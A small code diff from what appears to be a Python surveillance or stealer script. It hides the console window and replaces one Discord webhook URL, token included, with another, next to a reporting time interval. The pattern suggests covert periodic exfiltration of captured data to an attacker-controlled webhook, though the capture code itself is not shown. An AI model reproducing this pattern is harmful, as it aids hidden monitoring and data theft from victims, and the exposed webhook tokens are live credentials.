@@ -6,7 +6,7 @@ import win32con
 win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
 
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1001245390269579285/15ztWY51GLE4-4nUQbcADz_cdXxtAvikv86VWxmE_-_MICjys2IvowyvcAofiPU8GPrQ"  # discord webhook
+WEBHOOK_URL = "https://discord.com/api/webhooks/1003000203156136057/hSf6BNEgFHX1H6eW7tUMntLh43gd_-xX4fEmoItAepi4b6cxKEyO8sPLG77IWQUP2YE7"  # discord webhook
 TIME_INTERVAL = 14  #  time 
 
 
